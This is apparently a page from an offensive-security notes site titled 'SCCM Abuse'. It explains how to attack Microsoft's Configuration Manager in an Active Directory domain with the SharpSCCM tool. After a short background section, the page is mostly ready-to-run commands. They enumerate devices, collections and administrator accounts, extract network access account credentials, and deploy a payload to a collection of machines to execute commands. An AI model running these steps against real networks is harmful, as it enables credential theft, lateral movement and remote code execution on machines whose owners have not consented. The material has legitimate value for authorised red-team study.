---
layout: default
title: SCCM Abuse
parent: Active Directory
nav_order: 1
permalink: /ad/sccm/
---

# SCCM Abuse
{: .no_toc }

## Table of contents
{: .no_toc .text-delta }

1. TOC
{:toc}

---

## Vulnerability

Systems Center Configuration Manager (SCCM) is a Microsoft product to manage automated tasks on a collection of - *domain joined or not* - computers, such as application deployments, updates, patches, and configuration. If not properly configured, it could be abused to escalate your privileges on a computer, lateralize in the domain or even keep persistence.

## Prerequisites

* Initial foothold on a domain joined computer.

## Exploit

Following exploit will use [SharpSCCM](https://github.com/Mayyhem/SharpSCCM) tool.

### Enumeration

{: .warning }
> Information you will enumerate below are **updated in SCCM every 7 days** by default. Take that into consideration.

```powershell
# Get current management endpoint.
./SharpSCCM.exe local site-info --no-banner

# Get principals with GenericAll permissions on SCCM container.
./SharpSCCM.exe get site-info -d $domain --no-banner

# Get collections.
./SharpSCCM.exe get collections --no-banner

# Get collection's members.
./SharpSCCM.exe get collection-members -n $CollectionName --no-banner

# Get administrator accounts.
./SharpSCCM.exe get class-instances SMS_Admin --no-banner

# Get all devices.
./SharpSCCM.exe get devices --no-banner

# Get devices containing `$COMPUTER` in their name.
./SharpSCCM.exe get devices -n $COMPUTER --no-banner

# Get devices containing `$COMPUTER` in their name and filter on properties.
./SharpSCCM.exe get devices -n $COMPUTER -p Name -p FullDomainName -p IPAddresses -p LastLogonUserName -p OperatingSystemNameandVersion --no-banner

# Get devices on which `$Username` was the last to login.
./SharpSCCM.exe get devices -u $Username -p IPAddresses -p IPSubnets -p Name --no-banner
```

### Extract network access account credentials

The purpose of these credentials is for **not** domain-joined computers to access SCCM Software Distribution Points. They should have read-only access to it, but they are often over privileged because of misconfigurations.

```powershell
# You can replace `-m wmi` by `-m disk`.
./SharpSCCM.exe local naa -m wmi --no-banner

# Rather than extracting locally, you can - kindly - ask to SCCM.
./SharpSCCM.exe get naa --no-banner
```

### Deploy applications

If you are *Full Administrator* or *Application Administrator* of a device or a collection, you can execute commands on it.

```powershell
./SharpSCCM.exe exec -n $CollectionName -p $PayloadPath --no-banner
```

## Useful links

* [Fundamentals of role-based administration for SCCM](https://learn.microsoft.com/en-us/mem/configmgr/core/understand/fundamentals-of-role-based-administration)